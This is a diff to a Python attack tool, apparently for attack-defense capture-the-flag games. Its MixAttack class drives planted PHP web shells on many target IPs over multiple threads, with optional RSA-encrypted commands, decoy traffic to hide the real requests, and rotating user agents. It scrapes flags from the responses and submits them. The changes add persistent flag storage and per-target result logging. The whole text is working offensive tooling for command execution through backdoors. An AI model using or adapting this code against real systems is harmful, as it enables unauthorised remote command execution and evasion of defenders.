@@ -25,7 +25,7 @@ class MixAttack:
     def __init__(self, targets, shell_url='/shell.php', shell_pass='cmd',
                  threads=20, timeout=5, proxy=None, no_submit=False,
                  submit_url=None, token=None, use_rsa=False, rsa_agent=None,
-                 mix_mode=False, fake_count=8):
+                 mix_mode=False, fake_count=8, known_file=None):
         self.targets = targets if isinstance(targets, list) else [targets]
         self.shell_url = shell_url
         self.shell_pass = shell_pass
@@ -38,9 +38,11 @@ class MixAttack:
         self.use_rsa = use_rsa
         self.mix_mode = mix_mode
         self.fake_count = fake_count
+        self.known_file = known_file or KNOWN_FILE
         self.known = set()
         self.lock = threading.Lock()
         self.total_submitted = 0
+        self.last_results = {}
         self.running = True
         self.session = requests.Session()
         self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
@@ -51,15 +53,22 @@ class MixAttack:
         self.load_known()
 
     def load_known(self):
-        if os.path.exists(KNOWN_FILE):
-            with open(KNOWN_FILE) as f:
+        if os.path.exists(self.known_file):
+            with open(self.known_file, encoding='utf-8') as f:
                 self.known = set(json.load(f))
 
     def save_known(self):
-        tmp = KNOWN_FILE + '.tmp'
-        with open(tmp, 'w') as f:
-            json.dump(list(self.known), f)
-        os.replace(tmp, KNOWN_FILE)
+        directory = os.path.dirname(os.path.abspath(self.known_file))
+        os.makedirs(directory, exist_ok=True)
+        tmp = self.known_file + '.' + str(os.getpid()) + '.' + str(threading.get_ident()) + '.tmp'
+        try:
+            with open(tmp, 'x', encoding='utf-8') as f:
+                json.dump(sorted(self.known), f, ensure_ascii=False)
+                f.flush(); os.fsync(f.fileno())
+            os.replace(tmp, self.known_file)
+        finally:
+            try: os.unlink(tmp)
+            except FileNotFoundError: pass
 
     def log(self, msg, level='INFO'):
         ts = datetime.now().strftime('%H:%M:%S')
@@ -98,12 +107,15 @@ class MixAttack:
         port = f':{self.args.port}' if hasattr(self, 'args') and self.args and getattr(self.args, 'port', 80) != 80 else ''
         base = f'{proto}://{ip}{port}'
         found = False
+        request_successes = 0
+        last_error = ''
         url = base + self.shell_url
         for cmd in cmds:
             try:
                 if self.use_rsa:
                     payload = self.rsa.encrypt_payload(cmd)
                     r = self.session.post(url, data={'d': payload}, timeout=self.timeout)
+                    request_successes += 1
                     if r.status_code == 200 and r.text.strip():
                         plain = self.rsa.decrypt_response(r.text.strip())
                         for flag in self.extract_flags(plain):
@@ -112,15 +124,18 @@ class MixAttack:
                                 found = True
                 else:
                     r = self.session.post(url, data={self.shell_pass: cmd}, timeout=self.timeout)
+                    request_successes += 1
                     if r.status_code == 200:
                         for flag in self.extract_flags(r.text):
                             if flag not in self.known:
                                 self.submit_flag(flag, ip)
                                 found = True
-            except Exception:
-                pass
+            except Exception as exc:
+                last_error = str(exc)
             if not self.running:
                 break
+        with self.lock:
+            self.last_results[ip] = {'found': found, 'request_successes': request_successes, 'error': last_error}
         return found
 
     def _mix_request(self, url, passwd, real_cmd):
@@ -149,31 +164,37 @@ class MixAttack:
         base = f'{proto}://{ip}{port}'
         url = base + self.shell_url
         found = False
+        request_successes = 0
+        last_error = ''
         for cmd in cmds:
             if self.use_rsa:
                 enc_cmd = self.rsa.encrypt_payload(cmd)
                 self._mix_request(url, 'd', enc_cmd)
                 try:
                     r = self.session.post(url, data={'d': enc_cmd}, timeout=self.timeout)
+                    request_successes += 1
                     if r.status_code == 200 and r.text.strip():
                         plain = self.rsa.decrypt_response(r.text.strip())
                         for flag in self.extract_flags(plain):
                             if flag not in self.known:
                                 self.submit_flag(flag, ip)
                                 found = True
-                except Exception:
-                    pass
+                except Exception as exc:
+                    last_error = str(exc)
             else:
                 self._mix_request(url, self.shell_pass, cmd)
                 try:
                     r = self.session.post(url, data={self.shell_pass: cmd}, timeout=self.timeout)
+                    request_successes += 1
                     if r.status_code == 200:
                         for flag in self.extract_flags(r.text):
                             if flag not in self.known:
                                 self.submit_flag(flag, ip)
                                 found = True
-                except Exception:
-                    pass
+                except Exception as exc:
+                    last_error = str(exc)
+        with self.lock:
+            self.last_results[ip] = {'found': found, 'request_successes': request_successes, 'error': last_error}
         return found
 
     def run_batch(self, cmds, mix_only=False):
